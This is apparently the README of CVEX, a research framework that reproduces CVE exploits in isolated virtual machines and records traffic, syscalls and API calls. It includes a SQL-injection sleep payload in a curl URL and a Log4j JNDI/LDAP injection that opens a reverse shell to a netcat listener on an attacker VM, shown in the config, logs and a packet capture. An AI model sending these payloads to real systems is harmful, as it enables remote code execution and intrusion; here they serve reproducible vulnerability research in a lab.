# CVEX: eXecutable CVEs

What is CVEX?

CVEX is a framework for the reproducible exploitation of CVE vulnerabilities:
- Provides blueprints of pre-made exploitation setups, pre-configured with metadata collection facilities (raw traffic, HTTP/S requests, system calls/API calls).
- Uses virtualization to instantiate the blueprint and automatically execute the attack, supporting live analysis of exploitation.
- Separates infrastructure from CVE-related configuration allowing for reuse of blueprints.
- Incentivizes contributors to share reproducible exploits.

Tech stack:
- Virtualization: Vagrant
- Installation and configuration: Ansible
- Network traffic collection: tcpdump
- HTTPS collection: mitmproxy
- Linux syscall collection: strace
- Windows API collection: Process Monitor

## Installation

### Python

[Install](https://cloudbytes.dev/snippets/upgrade-python-to-latest-version-on-ubuntu-linux) Python 3.10 or higher.
 
Then install Python dependencies using Poetry:

```shell
sudo apt update
sudo apt install python3-poetry
poetry install
```

And activate a Poetry shell to use the dependencies:
```shell
poetry shell
```

### VirtualBox

While in theory Vagrant should work with any VM provider, CVEX was tested only with VirtualBox. Install VirtualBox this way:
```
sudo apt update
sudo apt install virtualbox virtualbox-ext-pack
```

## Run

Execute from the root CVEX folder:
```
~/CVEX$ python3 -m cvex -c CVE-0000-00001
```

CVEX comes with a set of PoC CVEs:
- [CVE-0000-00000](records/CVE-0000-00000): curl, executed on Windows, downloads a web-page from ngix, running on Ubuntu
- [CVE-0000-00001](records/CVE-0000-00001): curl, executed on Ubuntu, downloads a web-page from ngix, running on another Ubuntu
- [CVE-0000-00002](records/CVE-0000-00002): curl, executed on Ubuntu, downloads a web-page from ngix, running on Windows
- [CVE-0000-00003](records/CVE-0000-00003): curl, executed on Windows, downloads a web-page from ngix, running on another Windows
- [CVE-2021-44228](records/CVE-2021-44228): Log4j vulnerability with backconnect to remote shell

<details>
<summary>Execution of CVE-0000-00000</summary>
[records/CVE-0000-00000/cvex.yml](records/CVE-0000-00000/cvex.yml) describes the VM infrastructure for this PoC:
```
blueprint: windows10-ubuntu2204
ubuntu:
  trace: nginx
  playbook: linux.yml
windows:
  trace: "curl"
  command: "curl https://ubuntu/index.html?cat=(select*from(select(sleep(15)))a)"
```

Full list of parameters of a CVEX record:
```
blueprint: ...   # Blueprint name from the "blueprints" folder
ports: ...       # HTTPS port(s) as integer or list of integers (optional; 443 by default)
...:             # Name of the VM as in the blueprint
  trace: ...     # Name of the process for API tracing (optional); for Windows: partial name of the process; for Linux: regular expression
  playbook: ...  # Ansible playbook (optional)
  command: ...   # Command or list of commands to execute on this VM (optional)
...:
  trace: ...
  playbook: ...
  command: ...
...
```

`command` is treated in a special way:
1. `%vm_name%` will be replaced with the IP address of the VM: `curl https://%ubuntu%:8080/` will turn into `curl https://192.168.56.3:8080/`
2. Optional `&` at the end of the command tells CVEX that it is non-blocking: for `curl https://%ubuntu%:8080/&` CVEX executes `curl https://192.168.56.3:8080/`, and then immediately executes next command without waiting for curl to finish execution
3. Optional `~~~` splits the command into two parts: 1) the command; 2) the message: for `curl https://%ubuntu%:8080/&~~~Downloaded` CVEX executes `curl https://192.168.56.3:8080/`, then waits until curl prints `Downloaded` to stdout, and then immediately executes next command without waiting for curl to finish execution

CVEX blueprints define minimal network deployments:
- Ubuntu host attacking Window host
- Window host attacking Ubuntu host
- Ubuntu host attacking multiple Windows hosts
- ...

Contributors can provide additional blueprints. In the case of CVE-0000-00000 the blueprint `windows10-ubuntu2204` is stored in [/blueprint/windows10-ubuntu2204/blueprint.yml](/blueprint/windows10-ubuntu2204/blueprint.yml):
```
windows:
  image: "gusztavvargadr/windows-10"
  version: "2202.0.2404"
  type: "windows"
ubuntu:
  image: "bento/ubuntu-22.04"
  version: "202404.23.0"
  type: "linux"
```

Full list of parameters of a blueprint:
```
...:             # Name of the VM
  image: ...     # Vagrant image
  version: ...   # Vagrant image version
  type: ...      # "windows" or "linux"
  playbook: ...  # Ansible playbook (optional)
...:
  image: ...
  version: ...
  type: ...
  playbook: ...
...
```

At first, CVEX pulls the Ubuntu VM from the Vagrant repository and stores the config file of the VM in ~/.cvex/router. This Ubuntu VM will act as a router. It also creates the `clean` snapshot with the initial state of the VM:
```
~/CVEX$ python3 -m cvex -c CVE-0000-00000
2024-09-13 13:52:30,081 - INFO - [router] Retrieving status of router...
2024-09-13 13:52:32,820 - INFO - [router] Initializing a new VM router at /home/john/.cvex/router...
2024-09-13 13:52:33,766 - INFO - [router] Starting the VM router...
2024-09-13 13:54:41,199 - INFO - [router] Creating snapshot 'clean' for VM router (192.168.56.2)...
```

Ansible scripts from [ansible](/ansible) are used to pre-configure VMs. CVEX runs the [ansible/router.yml](/ansible/router.yml) Ansible playbook before creating the `router` snapshot:
```
2024-09-13 13:54:56,344 - INFO - [router] Executing Ansible playbook ansible/router.yml...
2024-09-13 13:54:58,042 - INFO - [router] 
2024-09-13 13:54:58,043 - INFO - [router] PLAY [Router] ******************************************************************
2024-09-13 13:54:58,043 - INFO - [router] 
2024-09-13 13:54:58,043 - INFO - [router] TASK [Gathering Facts] *********************************************************
2024-09-13 13:55:01,136 - INFO - [router] [WARNING]: Platform linux on host router is using the discovered Python
2024-09-13 13:55:01,137 - INFO - [router] interpreter at /usr/bin/python3.10, but future installation of another Python
2024-09-13 13:55:01,137 - INFO - [router] interpreter could change the meaning of that path. See
2024-09-13 13:55:01,137 - INFO - [router] https://docs.ansible.com/ansible-
2024-09-13 13:55:01,137 - INFO - [router] core/2.17/reference_appendices/interpreter_discovery.html for more information.
2024-09-13 13:55:01,162 - INFO - [router] ok: [router]
2024-09-13 13:55:01,162 - INFO - [router] 
2024-09-13 13:55:01,166 - INFO - [router] TASK [Pull mitmproxy-10.3.1-linux-x86_64.tar.gz] *******************************
2024-09-13 13:55:20,994 - INFO - [router] changed: [router]
2024-09-13 13:55:20,994 - INFO - [router] 
2024-09-13 13:55:20,994 - INFO - [router] TASK [Run mitmdump] ************************************************************
2024-09-13 13:55:21,824 - INFO - [router] changed: [router]
2024-09-13 13:55:21,824 - INFO - [router] 
2024-09-13 13:55:21,824 - INFO - [router] TASK [Wait for ~/.mitmproxy] ***************************************************
2024-09-13 13:55:25,603 - INFO - [router] ok: [router]
2024-09-13 13:55:25,603 - INFO - [router] 
2024-09-13 13:55:25,603 - INFO - [router] TASK [Kill mitmdump] ***********************************************************
2024-09-13 13:55:26,131 - INFO - [router] changed: [router]
2024-09-13 13:55:26,131 - INFO - [router] 
2024-09-13 13:55:26,131 - INFO - [router] TASK [Copy certindex] **********************************************************
2024-09-13 13:55:27,643 - INFO - [router] changed: [router]
2024-09-13 13:55:27,643 - INFO - [router] 
2024-09-13 13:55:27,643 - INFO - [router] TASK [Copy default.cfg] ********************************************************
2024-09-13 13:55:29,027 - INFO - [router] changed: [router]
2024-09-13 13:55:29,027 - INFO - [router] 
2024-09-13 13:55:29,027 - INFO - [router] TASK [Generate CRL] ************************************************************
2024-09-13 13:55:29,556 - INFO - [router] changed: [router]
2024-09-13 13:55:29,557 - INFO - [router] 
2024-09-13 13:55:29,557 - INFO - [router] TASK [Convert CRL from PEM to DER] *********************************************
2024-09-13 13:55:30,088 - INFO - [router] changed: [router]
2024-09-13 13:55:30,088 - INFO - [router] 
2024-09-13 13:55:30,088 - INFO - [router] TASK [Fetch root.crl] **********************************************************
2024-09-13 13:55:30,711 - INFO - [router] changed: [router]
2024-09-13 13:55:30,711 - INFO - [router] 
2024-09-13 13:55:30,711 - INFO - [router] TASK [Fetch mitmproxy-ca-cert.cer] *********************************************
2024-09-13 13:55:31,336 - INFO - [router] changed: [router]
2024-09-13 13:55:31,336 - INFO - [router] 
2024-09-13 13:55:31,336 - INFO - [router] PLAY RECAP *********************************************************************
2024-09-13 13:55:31,337 - INFO - [router] router                     : ok=11   changed=9    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0
2024-09-13 13:55:31,461 - INFO - [router] Creating snapshot 'router' for VM router (192.168.56.2)...
```

After the router VM, CVEX runs the Windows VM:
```
2024-09-13 13:55:43,939 - INFO - [windows] Initializing a new VM windows at /home/john/.cvex/gusztavvargadr_windows-10/2202.0.2404/1...
2024-09-13 13:55:44,936 - INFO - [windows] Starting the VM windows...
```

Sometimes VM initialization takes longer than expected:
```
2024-09-13 14:03:41,858 - CRITICAL - [windows] VM windows timed out. Please wait until the VM is started and then re-start CVEX with the '-k' parameter.
```

In this case we need to wait until the VM is up and the OS is aready. For example, use the VirtualBox GUI. As soon as the OS fully loads, re-run CVEX with `-k`. With this parameter CVEX uses the VMs that are already running:
```
$ python3 -m cvex -c CVE-0000-00000 -k
2024-09-13 14:25:18,880 - INFO - [router] Retrieving status of router...
2024-09-13 14:25:23,828 - INFO - [router] VM router (192.168.56.2) is already running
2024-09-13 14:25:26,910 - INFO - [router] Retrieving snapshot list of router...
2024-09-13 14:25:29,701 - INFO - [windows] Looking for a VM with CVE-0000-00000/windows snapshot...
2024-09-13 14:25:35,875 - INFO - [windows] Retrieving status of windows...
2024-09-13 14:25:41,071 - INFO - [windows] VM windows (192.168.56.3) is already running
2024-09-13 14:25:45,390 - INFO - [windows] Retrieving snapshot list of windows...
2024-09-13 14:25:51,738 - INFO - [windows] Creating snapshot 'clean' for VM windows (192.168.56.3)...
```

CVEX runs the [ansible/windows.yml](/ansible/windows.yml) Ansible script before creating the `CVE-0000-00000/windows` snapshot:
```
2024-09-13 14:26:30,209 - INFO - [windows] Executing Ansible playbook ansible/windows.yml...
2024-09-13 14:26:31,345 - INFO - [windows] 
2024-09-13 14:26:31,346 - INFO - [windows] PLAY [Windows] *****************************************************************
2024-09-13 14:26:31,346 - INFO - [windows] 
2024-09-13 14:26:31,346 - INFO - [windows] TASK [Gathering Facts] *********************************************************
2024-09-13 14:27:21,945 - INFO - [windows] ok: [windows]
2024-09-13 14:27:21,946 - INFO - [windows] 
2024-09-13 14:27:21,946 - INFO - [windows] TASK [Create C:\Tools] *********************************************************
2024-09-13 14:28:04,478 - INFO - [windows] changed: [windows]
2024-09-13 14:28:04,478 - INFO - [windows] 
2024-09-13 14:28:04,479 - INFO - [windows] TASK [Download Process Monitor] ************************************************
2024-09-13 14:28:42,227 - INFO - [windows] changed: [windows]
2024-09-13 14:28:42,227 - INFO - [windows] 
2024-09-13 14:28:42,227 - INFO - [windows] TASK [Unzip ProcessMonitor.zip] ************************************************
2024-09-13 14:29:19,518 - INFO - [windows] changed: [windows]
2024-09-13 14:29:19,518 - INFO - [windows] 
2024-09-13 14:29:19,518 - INFO - [windows] TASK [Copy mitmproxy-ca-cert.cer] **********************************************
2024-09-13 14:32:03,983 - INFO - [windows] changed: [windows]
2024-09-13 14:32:03,983 - INFO - [windows] 
2024-09-13 14:32:03,983 - INFO - [windows] TASK [Install mitmproxy-ca-cert.cer] *******************************************
2024-09-13 14:32:50,823 - INFO - [windows] changed: [windows]
2024-09-13 14:32:50,823 - INFO - [windows] 
2024-09-13 14:32:50,823 - INFO - [windows] TASK [Copy root.crl] ***********************************************************
2024-09-13 14:35:47,857 - INFO - [windows] changed: [windows]
2024-09-13 14:35:47,858 - INFO - [windows] 
2024-09-13 14:35:47,858 - INFO - [windows] TASK [Install root.crl] ********************************************************
2024-09-13 14:36:31,914 - INFO - [windows] changed: [windows]
2024-09-13 14:36:31,914 - INFO - [windows] 
2024-09-13 14:36:31,914 - INFO - [windows] PLAY RECAP *********************************************************************
2024-09-13 14:36:31,914 - INFO - [windows] windows                    : ok=8    changed=7    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0
2024-09-13 14:36:31,914 - INFO - [windows] 
2024-09-13 14:36:32,194 - INFO - [windows] Creating snapshot 'CVE-0000-00000/windows' for VM windows (192.168.56.3)...
```

After the Windows VM, CVEX runs the Ubuntu VM:
```
2024-09-13 14:37:03,308 - INFO - [ubuntu] Looking for a VM with CVE-0000-00000/ubuntu snapshot...
2024-09-13 14:37:05,749 - INFO - [ubuntu] Retrieving status of ubuntu...
2024-09-13 14:37:07,563 - INFO - [ubuntu] Initializing a new VM ubuntu at /home/john/.cvex/bento_ubuntu-22.04/202404.23.0/1...
2024-09-13 14:37:09,382 - INFO - [ubuntu] Starting the VM ubuntu...
2024-09-13 14:40:50,765 - INFO - [ubuntu] Creating snapshot 'clean' for VM ubuntu (192.168.56.4)...
```

When the VM is up, CVEX runs the [ansible/linux.yml](/ansible/linux.yml) Ansible playbook:
```
2024-09-13 14:41:11,647 - INFO - [ubuntu] Executing Ansible playbook ansible/linux.yml...
2024-09-13 14:41:13,576 - INFO - [ubuntu] 
2024-09-13 14:41:13,576 - INFO - [ubuntu] PLAY [Linux] *******************************************************************
2024-09-13 14:41:13,576 - INFO - [ubuntu] 
2024-09-13 14:41:13,576 - INFO - [ubuntu] TASK [Gathering Facts] *********************************************************
2024-09-13 14:41:19,893 - INFO - [ubuntu] [WARNING]: Platform linux on host ubuntu is using the discovered Python
2024-09-13 14:41:19,893 - INFO - [ubuntu] interpreter at /usr/bin/python3.10, but future installation of another Python
2024-09-13 14:41:19,893 - INFO - [ubuntu] interpreter could change the meaning of that path. See
2024-09-13 14:41:19,893 - INFO - [ubuntu] https://docs.ansible.com/ansible-
2024-09-13 14:41:19,894 - INFO - [ubuntu] core/2.17/reference_appendices/interpreter_discovery.html for more information.
2024-09-13 14:41:19,921 - INFO - [ubuntu] ok: [ubuntu]
2024-09-13 14:41:19,922 - INFO - [ubuntu] 
2024-09-13 14:41:19,922 - INFO - [ubuntu] TASK [Copy mitmproxy-ca-cert.cer] **********************************************
2024-09-13 14:41:22,855 - INFO - [ubuntu] changed: [ubuntu]
2024-09-13 14:41:22,855 - INFO - [ubuntu] 
2024-09-13 14:41:22,856 - INFO - [ubuntu] TASK [Run update-ca-certificates] **********************************************
2024-09-13 14:41:34,967 - INFO - [ubuntu] changed: [ubuntu]
2024-09-13 14:41:34,967 - INFO - [ubuntu] 
2024-09-13 14:41:34,967 - INFO - [ubuntu] PLAY RECAP *********************************************************************
2024-09-13 14:41:34,968 - INFO - [ubuntu] ubuntu                     : ok=3    changed=2    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0
```

[records/CVE-0000-00000/cvex.yml](records/CVE-0000-00000/cvex.yml) has an optional parameter `playbook: linux.yml` that specifies the custom Ansible playbook. In our case it installs nginx before creating the `CVE-0000-00000/ubuntu` snapshot:
```
2024-09-13 14:41:35,241 - INFO - [ubuntu] Executing Ansible playbook records/CVE-0000-00000/linux.yml...
2024-09-13 14:41:36,711 - INFO - [ubuntu] 
2024-09-13 14:41:36,711 - INFO - [ubuntu] PLAY [Linux target] ************************************************************
2024-09-13 14:41:36,711 - INFO - [ubuntu] 
2024-09-13 14:41:36,711 - INFO - [ubuntu] TASK [Gathering Facts] *********************************************************
2024-09-13 14:41:41,105 - INFO - [ubuntu] [WARNING]: Platform linux on host ubuntu is using the discovered Python
2024-09-13 14:41:41,105 - INFO - [ubuntu] interpreter at /usr/bin/python3.10, but future installation of another Python
2024-09-13 14:41:41,106 - INFO - [ubuntu] interpreter could change the meaning of that path. See
2024-09-13 14:41:41,106 - INFO - [ubuntu] https://docs.ansible.com/ansible-
2024-09-13 14:41:41,106 - INFO - [ubuntu] core/2.17/reference_appendices/interpreter_discovery.html for more information.
2024-09-13 14:41:41,138 - INFO - [ubuntu] ok: [ubuntu]
2024-09-13 14:41:41,138 - INFO - [ubuntu] 
2024-09-13 14:41:41,138 - INFO - [ubuntu] TASK [Install nginx 1.18.0] ****************************************************
2024-09-13 14:42:43,406 - INFO - [ubuntu] changed: [ubuntu]
2024-09-13 14:42:43,406 - INFO - [ubuntu] 
2024-09-13 14:42:43,406 - INFO - [ubuntu] TASK [Copy default.conf] *******************************************************
2024-09-13 14:42:45,154 - INFO - [ubuntu] changed: [ubuntu]
2024-09-13 14:42:45,154 - INFO - [ubuntu] 
2024-09-13 14:42:45,154 - INFO - [ubuntu] TASK [Copy certificate] ********************************************************
2024-09-13 14:42:46,761 - INFO - [ubuntu] changed: [ubuntu]
2024-09-13 14:42:46,761 - INFO - [ubuntu] 
2024-09-13 14:42:46,761 - INFO - [ubuntu] TASK [Copy key] ****************************************************************
2024-09-13 14:42:48,310 - INFO - [ubuntu] changed: [ubuntu]
2024-09-13 14:42:48,310 - INFO - [ubuntu] 
2024-09-13 14:42:48,310 - INFO - [ubuntu] TASK [Copy index.html] *********************************************************
2024-09-13 14:42:50,012 - INFO - [ubuntu] changed: [ubuntu]
2024-09-13 14:42:50,012 - INFO - [ubuntu] 
2024-09-13 14:42:50,012 - INFO - [ubuntu] TASK [Restart nginx] ***********************************************************
2024-09-13 14:42:51,638 - INFO - [ubuntu] changed: [ubuntu]
2024-09-13 14:42:51,638 - INFO - [ubuntu] 
2024-09-13 14:42:51,638 - INFO - [ubuntu] PLAY RECAP *********************************************************************
2024-09-13 14:42:51,639 - INFO - [ubuntu] ubuntu                     : ok=7    changed=6    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0
2024-09-13 14:42:51,639 - INFO - [ubuntu] 
2024-09-13 14:42:51,776 - INFO - [ubuntu] Creating snapshot 'CVE-0000-00000/ubuntu' for VM ubuntu (192.168.56.4)...
```

Every VM may have maximum 3 Ansible playbooks:
1. Configuration playbook ([ansible/linux.yml](/ansible/linux.yml)) - controlled by CVEX developers
2. Blueprint playbook (none in our case) - controlled by CVEX blueprint contributors
3. CVE playbook ([records/CVE-0000-00000/linux.yml](records/CVE-0000-00000/linux.yml)) - controlled by CVEX users

At this point all the VMs (router, Windows, Ubuntu) are up and running, the needed software is installed and the needed VM snapshots are created. CVEX performs the following actions:
- Configures the hosts file on every VM except the router
- Sets up static network interface IP addresses on every VM
- Configures the routing so that all network traffic flows through the router VM
- Runs tcpdump on the router
- Runs mitmproxy on the router
- Runs strace (on Linux)
- Runs Process Monitor (on Windows)

```
2024-09-13 14:43:04,575 - INFO - [router] Executing 'ls /etc/netplan'...
2024-09-13 14:43:07,653 - INFO - [router] Downloading /etc/netplan/00-installer-config.yaml...
2024-09-13 14:43:07,731 - INFO - [router] Downloading /etc/netplan/01-netcfg.yaml...
2024-09-13 14:43:07,760 - INFO - [router] Downloading /etc/netplan/50-vagrant.yaml...
2024-09-13 14:43:07,805 - INFO - [router] Uploading /tmp/cvex.yaml...
2024-09-13 14:43:07,828 - INFO - [router] Executing 'sudo mv /tmp/cvex.yaml /etc/netplan/50-vagrant.yaml'...
2024-09-13 14:43:07,894 - INFO - [router] Executing 'sudo ip link set eth1 up'...
2024-09-13 14:43:08,017 - INFO - [router] Executing 'sudo netplan apply'...
2024-09-13 14:43:12,316 - INFO - [router] Executing 'sudo ip route change 192.168.56.0/24 via 192.168.56.2 dev eth1'...
2024-09-13 14:43:12,402 - INFO - [router] Executing 'sudo systemctl restart ufw'...
2024-09-13 14:43:12,531 - INFO - [windows] Executing 'netsh interface ipv4 show inter'...
2024-09-13 14:43:13,943 - INFO - [windows] Executing 'netsh interface ipv4 set interface 5 dadtransmits=0 store=persistent'...
2024-09-13 14:43:14,155 - INFO - [windows] Executing 'powershell "Get-NetAdapter -Name 'Ethernet 2' | New-NetIPAddress -IPAddress 192.168.56.3 -DefaultGateway 192.168.56.2 -PrefixLength 24"'...
2024-09-13 14:43:35,697 - INFO - [windows] Executing 'powershell "Disable-NetAdapter -Name 'Ethernet 2' -Confirm:$False"'...
2024-09-13 14:43:50,320 - INFO - [windows] Executing 'powershell "Enable-NetAdapter -Name 'Ethernet 2' -Confirm:$False"'...
2024-09-13 14:44:04,036 - INFO - [windows] Executing 'route DELETE 192.168.56.0'...
2024-09-13 14:44:04,156 - INFO - [windows] Executing 'route print'...
2024-09-13 14:44:04,339 - INFO - [windows] Executing 'route ADD 192.168.56.0 MASK 255.255.255.0 192.168.56.2 if 5'...
2024-09-13 14:44:04,463 - INFO - [windows] Downloading /C:\Windows\System32\drivers\etc\hosts...
2024-09-13 14:44:04,691 - INFO - [windows] Uploading /C:\Windows\System32\drivers\etc\hosts...
2024-09-13 14:44:04,713 - INFO - [ubuntu] Executing 'ls /etc/netplan'...
2024-09-13 14:44:07,449 - INFO - [ubuntu] Downloading /etc/netplan/00-installer-config.yaml...
2024-09-13 14:44:07,542 - INFO - [ubuntu] Downloading /etc/netplan/01-netcfg.yaml...
2024-09-13 14:44:07,613 - INFO - [ubuntu] Downloading /etc/netplan/50-vagrant.yaml...
2024-09-13 14:44:07,650 - INFO - [ubuntu] Uploading /tmp/cvex.yaml...
2024-09-13 14:44:07,698 - INFO - [ubuntu] Executing 'sudo mv /tmp/cvex.yaml /etc/netplan/50-vagrant.yaml'...
2024-09-13 14:44:07,749 - INFO - [ubuntu] Executing 'sudo ip link set eth1 up'...
2024-09-13 14:44:07,866 - INFO - [ubuntu] Executing 'sudo netplan apply'...
2024-09-13 14:44:11,357 - INFO - [ubuntu] Executing 'sudo ip route change 192.168.56.0/24 via 192.168.56.2 dev eth1'...
2024-09-13 14:44:11,452 - INFO - [ubuntu] Executing 'sudo systemctl restart ufw'...
2024-09-13 14:44:11,604 - INFO - [ubuntu] Downloading /etc/hosts...
2024-09-13 14:44:11,674 - INFO - [ubuntu] Uploading /tmp/hosts...
2024-09-13 14:44:11,693 - INFO - [ubuntu] Executing 'sudo mv /tmp/hosts /etc/hosts'...
2024-09-13 14:44:11,772 - INFO - [router] Executing 'pkill mitmdump'...
2024-09-13 14:44:11,850 - INFO - [router] Executing 'sudo pkill tcpdump'...
2024-09-13 14:44:11,965 - INFO - [router] Executing 'rm -rf /tmp/cvex'...
2024-09-13 14:44:12,021 - INFO - [router] Executing 'mkdir /tmp/cvex'...
2024-09-13 14:44:12,092 - INFO - [router] Executing 'sudo sysctl net.ipv4.ip_forward=1'...
2024-09-13 14:44:12,181 - INFO - [router] Executing 'sudo tcpdump -i eth1 -U -w /tmp/cvex/router_raw.pcap'...
2024-09-13 14:44:12,238 - INFO - [router] Executing 'sudo iptables -t nat -I PREROUTING --src 0/0 --dst 0/0 -p tcp --dport 443 -j REDIRECT --to-ports 8080'...
2024-09-13 14:44:12,847 - INFO - [router] Executing 'mitmdump --mode transparent -k --set block_global=false -w /tmp/cvex/router_mitmdump.stream'...
2024-09-13 14:44:18,321 - INFO - [windows] Executing 'taskkill /IM Procmon.exe /F'...
2024-09-13 14:44:18,675 - INFO - [windows] Executing 'rmdir /S /Q C:\cvex'...
2024-09-13 14:44:18,765 - INFO - [windows] Executing 'mkdir C:\cvex'...
2024-09-13 14:44:18,852 - INFO - [windows] Uploading /C:\cvex\config.pmc...
2024-09-13 14:44:18,894 - INFO - [windows] Executing 'C:\Tools\Procmon64.exe /AcceptEula /BackingFile C:\cvex\procmon.pml /LoadConfig C:\cvex\config.pmc /Quiet'...
2024-09-13 14:44:18,917 - INFO - [ubuntu] Executing 'sudo pkill strace'...
2024-09-13 14:44:19,008 - INFO - [ubuntu] Executing 'rm -rf /tmp/cvex'...
2024-09-13 14:44:19,078 - INFO - [ubuntu] Executing 'mkdir /tmp/cvex'...
2024-09-13 14:44:19,133 - INFO - [ubuntu] Executing 'ps -ax | egrep "nginx" | grep -v grep'...
2024-09-13 14:44:19,238 - INFO - [ubuntu] Executing 'sudo strace -p 3934 -o /tmp/cvex/ubuntu_strace_nginx_3934.log -v'...
2024-09-13 14:44:19,399 - INFO - [ubuntu] Executing 'sudo strace -p 3935 -o /tmp/cvex/ubuntu_strace_nginx_3935.log -v'...
2024-09-13 14:44:19,527 - INFO - [ubuntu] Executing 'sudo strace -p 3936 -o /tmp/cvex/ubuntu_strace_nginx_3936.log -v'...
```


At this point all VMs are ready to reproduce the CVE. CVEX executes the command from cvex.yml:
```
2024-09-13 14:44:19,648 - INFO - [windows] Executing 'curl https://ubuntu/index.html?cat=(select*from(select(sleep(15)))a)'...
```

The curl command has succeeded. CVEX downloads logs and puts them to the default output folder `out`:
- From router: tcpdump's PCAP file
- From router: mitmdump's log file
- From Windows: Process Monitor's log file
- From Linux: strace's log files

Parameter `-o` specifies custom output folder.

```
2024-09-13 14:44:21,063 - INFO - [windows] Executing 'C:\Tools\Procmon64.exe /AcceptEula /Terminate'...
2024-09-13 14:44:30,975 - INFO - [windows] Executing 'C:\Tools\Procmon64.exe /AcceptEula /OpenLog C:\cvex\procmon.pml /SaveAs C:\cvex\procmon.xml'...
2024-09-13 14:44:31,948 - INFO - [windows] Downloading /C:\cvex\procmon.pml...
2024-09-13 14:44:32,644 - INFO - [windows] Downloading /C:\cvex\procmon.xml...
2024-09-13 14:44:33,304 - INFO - [ubuntu] Downloading /tmp/cvex/ubuntu_strace_nginx_3934.log...
2024-09-13 14:44:33,403 - INFO - [ubuntu] Downloading /tmp/cvex/ubuntu_strace_nginx_3935.log...
2024-09-13 14:44:33,436 - INFO - [ubuntu] Downloading /tmp/cvex/ubuntu_strace_nginx_3936.log...
2024-09-13 14:44:33,471 - INFO - [router] Wait for 5 seconds to let tcpdump and mitmdump flush logs on disk...
2024-09-13 14:44:38,472 - INFO - [router] Downloading /tmp/cvex/router_raw.pcap...
2024-09-13 14:44:38,524 - INFO - [router] Downloading /tmp/cvex/router_mitmdump.stream...
```
</details>

<details>
<summary>Execution of CVE-2021-44228 and analysis of logs</summary>
[records/CVE-2021-44228/cvex.yml](records/CVE-2021-44228/cvex.yml) describes the VM infrastructure for this CVE:
```
blueprint: ubuntu2204-ubuntu2204
ubuntu1:
  playbook: ubuntu1.yml
ubuntu2:
  playbook: ubuntu2.yml
  trace: "curl|python3|nc|java"
  command:
    - "python3 /opt/log4j-shell-poc/poc.py --userip %ubuntu2% --webport 9999 --lport 1234&~~~Listening on 0.0.0.0:1389"
    - "nc -nvlp 1234&~~~Listening on 0.0.0.0 1234"
    # Web server may not reply, which will cause curl to hang
    - "curl -d 'uname=%24%7Bjndi%3Aldap%3A%2F%2F%ubuntu2%%3A1389%2Fa%7D&password=' http://ubuntu1:8080/login&"
    - "sleep 10"
```

Ansible playbook `ubuntu1.yml` installs a Tomcat based web application, vulnerable to the Log4j attack. Ansible playbook `ubuntu2.yml` installs a fake LDAP server and a web server that is hosting the payload.


Execution of CVE-2021-44228 is no different from any other CVE:
```
~/CVEX$ python3 -m cvex -c CVE-2021-44228
```

The section "Execution of CVE-0000-00000" describes the execution process in details, therefore we will omit it here. Instead, let's focus on analysis of logs produced by CVEX. The IP address of ubuntu1 is 192.168.56.3, the IP address of ubuntu2 is 192.168.56.4:
```
2024-10-09 15:27:10,423 - INFO - [ubuntu1] Restoring VM ubuntu1 (192.168.56.3) to snapshot 'clean'...
...
2024-10-09 15:30:14,814 - INFO - [ubuntu2] Restoring VM ubuntu2 (192.168.56.4) to snapshot 'clean'...

```

Final stepts of execution:
```
024-10-09 15:33:51,063 - INFO - [ubuntu2] Executing 'python3 /tmp/cvex/agent.py "curl|python3|nc|java" /tmp/cvex ubuntu2'...
2024-10-09 15:33:52,077 - INFO - [ubuntu2] Executing 'strace -o /tmp/cvex/ubuntu2_strace_python3_0.log python3 /opt/log4j-shell-poc/poc.py --userip 192.168.56.4 --webport 9999 --lport 1234'...
2024-10-09 15:34:03,010 - INFO - [ubuntu2] Executing 'strace -o /tmp/cvex/ubuntu2_strace_nc_1.log nc -nvlp 1234'...
2024-10-09 15:34:03,127 - INFO - [ubuntu2] Executing 'strace -o /tmp/cvex/ubuntu2_strace_curl_2.log curl -d 'uname=%24%7Bjndi%3Aldap%3A%2F%2F192.168.56.4%3A1389%2Fa%7D&password=' http://ubuntu1:8080/login'...
2024-10-09 15:34:03,150 - INFO - [ubuntu2] Executing 'sleep 10'...
2024-10-09 15:34:13,202 - INFO - [ubuntu2] Executing 'pkill python3'...
2024-10-09 15:34:13,282 - INFO - [ubuntu2] Executing 'sudo pkill strace'...
2024-10-09 15:34:13,389 - INFO - [ubuntu2] Executing 'ls /tmp/cvex/*strace*.log'...
2024-10-09 15:34:13,439 - INFO - [ubuntu2] Downloading /tmp/cvex/ubuntu2_strace_curl_2.log...
2024-10-09 15:34:13,501 - INFO - [ubuntu2] Downloading /tmp/cvex/ubuntu2_strace_curl_4821.log...
2024-10-09 15:34:13,618 - INFO - [ubuntu2] Downloading /tmp/cvex/ubuntu2_strace_curl_4824.log...
2024-10-09 15:34:13,642 - INFO - [ubuntu2] Downloading /tmp/cvex/ubuntu2_strace_nc_1.log...
2024-10-09 15:34:13,672 - INFO - [ubuntu2] Downloading /tmp/cvex/ubuntu2_strace_nc_4817.log...
2024-10-09 15:34:13,693 - INFO - [ubuntu2] Downloading /tmp/cvex/ubuntu2_strace_nc_4820.log...
2024-10-09 15:34:13,704 - INFO - [ubuntu2] Downloading /tmp/cvex/ubuntu2_strace_python3_0.log...
2024-10-09 15:34:13,728 - INFO - [ubuntu2] Downloading /tmp/cvex/ubuntu2_strace_python3_4721.log...
2024-10-09 15:34:13,867 - INFO - [ubuntu2] Downloading /tmp/cvex/ubuntu2_strace_python3_4724.log...
2024-10-09 15:34:13,877 - INFO - [router] Wait for 5 seconds to let tcpdump and mitmdump flush logs on disk...
2024-10-09 15:34:18,884 - INFO - [router] Downloading /tmp/cvex/router_raw.pcap...
2024-10-09 15:34:18,911 - INFO - [router] Downloading /tmp/cvex/router_mitmdump.stream...
```

To inspect the PCAP file, run tcpdump:
```
~/CVEX$ tcpdump -qns 0 -A -r out/router_raw.pcap
```

The attacker 192.168.56.4 (ubuntu2) issues an HTTP POST request to Apache Tomcat running on 192.168.56.3 (ubuntu1). The POST request contains malicious data `${jndi:ldap://192.168.56.4:1389/a}` in the `uname` field. The data is URL-encoded:
```
15:34:03.050477 IP 192.168.56.4.36880 > 192.168.56.3.8080: tcp 219
E....t@.@.....8...8.....:.u................
.....$C.POST /login HTTP/1.1
Host: ubuntu1:8080
User-Agent: curl/7.81.0
Accept: */*
Content-Length: 68
Content-Type: application/x-www-form-urlencoded

uname=%24%7Bjndi%3Aldap%3A%2F%2F192.168.56.4%3A1389%2Fa%7D&password=
```

